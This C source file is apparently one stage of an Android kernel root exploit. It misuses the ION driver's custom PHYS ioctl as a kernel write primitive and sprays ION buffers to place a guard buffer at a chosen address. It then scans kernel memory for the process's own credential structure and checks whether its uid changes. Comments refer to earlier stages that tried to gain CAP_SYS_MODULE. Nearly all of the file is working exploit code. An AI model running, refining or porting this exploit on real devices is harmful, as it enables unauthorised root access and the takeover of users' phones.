/* approot7.c - did the usage anchor reach our own credential?
 *
 * The candidate list from approot5 has 1525 entries whose word at +0 is 192, and
 * 485 of them accept a write at +52. None lifted CAP_SYS_MODULE, which leaves one
 * question open: is our own credential in that list at all?
 *
 * The answer is measurable without guessing. The store for the anchor lands at
 * +4, i.e. uid, so if our credential were among the matches, getuid() would have
 * changed by the end of phase A. This prints exactly that, and also prints the
 * candidate addresses so the next step can be reasoned about instead of guessed.
 *
 * Run: run-as com.charepa ./approot7 <threads> <lo> <hi>
 *
 * Build: aarch64-linux-gnu-gcc -static -O2 -pthread -o approot7 approot7.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/mman.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define ION_SLOT 3000
#define CRED_STEP 192
#define CRED_SLOTS 21

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[256]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_buf(int *out_fd, u32 *out_iova){
    struct ion_allocation_data a; memset(&a,0,sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d,0,sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    struct ion_phys_data p; memset(&p,0,sizeof p); p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
    *out_iova = 0;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) *out_iova = p.addr;
    *out_fd = d.fd;
    return 1;
}
static int carve(u32 want, int *out_fd){
    static int held[2048]; int n = 0;
    while (n < 2000){
        int f; u32 iv;
        if (!mk_buf(&f, &iv)) break;
        if (iv == want){ *out_fd = f; for (int i = 0; i < n; i++) close(held[i]); return 1; }
        held[n++] = f;
    }
    for (int i = 0; i < n; i++) close(held[i]);
    return 0;
}
static void *park(void *p){ (void)p; for (;;) pause(); return NULL; }

int main(int argc, char **argv){
    int want_threads = argc > 1 ? atoi(argv[1]) : 0;
    int guard_off = argc > 4 ? atoi(argv[4]) : 0;
    u32 lo = argc > 2 ? (u32)strtoul(argv[2], NULL, 16) : 0x01000000u;
    u32 hi = argc > 3 ? (u32)strtoul(argv[3], NULL, 16) : 0x7f000000u;

    { char lp[512]; snprintf(lp, sizeof lp, "%s.log", argv[0]);
      LOG = fopen(lp, "w"); if (!LOG) LOG = stdout; }
    setbuf(LOG, NULL);
    say("approot7 uid=%d pid=%d threads=%d\n", getuid(), getpid(), want_threads);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        say("fds soft=%ld hard=%ld\n", (long)rl.rlim_cur, (long)rl.rlim_max);
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ion fd=%d\n", ionfd);

    for (int i = 0; i < want_threads; i++){
        pthread_t t;
        if (pthread_create(&t, NULL, park, NULL) != 0) break;
        pthread_detach(t);
    }
    usleep(20000);

    int threads = -1;
    { FILE *f = fopen("/proc/self/status", "r");
      if (f){ char l[256]; while (fgets(l, sizeof l, f))
          if (!strncmp(l, "Threads:", 8)) { threads = atoi(l + 8); break; } fclose(f); } }
    int guard = threads + guard_off;
    say("Threads=%d guard word %d (offset %d)\n", threads, guard, guard_off);

    u32 giova = 0x80000000u | ((u32)guard << 12);
    int g;
    if (!carve(giova, &g)){ say("no buffer with iova 0x%08x\n", giova); return 0; }
    if (g != guard){
        if (dup2(g, guard) < 0){ say("dup2(%d) errno=%d\n", guard, errno); return 0; }
        close(g);
    } else {
        say("guard buffer already at fd %d\n", guard);
    }
    say("guard on fd %d, iova 0x%08x\n", guard, giova);

    u32 uid0 = (u32)getuid();
    say("uid before phase A = %u (0x%08x)\n", uid0, uid0);

    static u64 cand[8192]; int nc = 0;
    long probes = 0, stores = 0;
    for (u32 p = lo; p < hi && nc < 8192; p += PGSZ){
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int s = 0; s < CRED_SLOTS; s++){
            u64 o = pg + (u64)s * CRED_STEP;
            if ((size_t)s * CRED_STEP + 132 >= PGSZ) break;
            probes++;
            if (gate(o) != 0) continue;
            stores++;
            if (nc < 8192) cand[nc++] = o;
            /* if this was our own cred, uid changed right here */
            if ((u32)getuid() != uid0){
                say("UID CHANGED during phase A: candidate 0x%llx is our cred\n",
                    (unsigned long long)o);
                nc--;                    /* do not re-test the one already written */
                say("phase A probes=%ld stores=%ld candidates=%d\n", probes, stores, nc);
                say("own cred offset in page: 0x%llx\n",
                    (unsigned long long)(o & 0xFFF));
                say("APPROOT7 DONE (anchor reached our cred)\n");
                return 0;
            }
        }
    }
    say("phase A probes=%ld stores=%ld candidates=%d\n", probes, stores, nc);
    say("uid after phase A = %u (unchanged: %s)\n", (u32)getuid(),
        (u32)getuid() == uid0 ? "our cred was NOT among the matches" : "changed");
    if (nc) say("first candidate 0x%llx last 0x%llx\n",
                (unsigned long long)cand[0], (unsigned long long)cand[nc-1]);
    say("APPROOT7 DONE\n");
    return 0;
}
